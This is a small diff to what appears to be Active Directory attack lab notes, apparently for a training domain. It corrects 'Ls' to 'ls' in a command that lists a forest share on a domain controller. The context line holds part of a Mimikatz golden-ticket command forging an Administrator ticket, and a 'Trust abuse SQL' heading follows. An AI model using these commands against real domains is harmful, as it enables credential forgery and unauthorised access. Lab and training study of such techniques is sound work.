@@ -1014,7 +1014,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarco
 
 #### Check access to server
 ```
-Ls \\eurocorp-dc.eurocorp.local\forestshare\
+ls \\eurocorp-dc.eurocorp.local\forestshare\
 ```
 
 ### Trust abuse SQL
